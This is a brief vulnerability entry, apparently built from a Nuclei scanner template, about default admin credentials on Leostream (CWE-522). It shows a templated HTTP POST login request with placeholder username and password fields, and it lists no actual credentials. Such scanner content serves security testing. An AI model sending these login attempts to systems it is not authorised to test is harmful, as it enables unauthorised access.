# Vulnerability: Leostream Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`leostream-default-login.yaml`)

## Description
Leostream default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}

login_type=0&user={{username}}&password={{password}}&submit=SIGN+IN
```

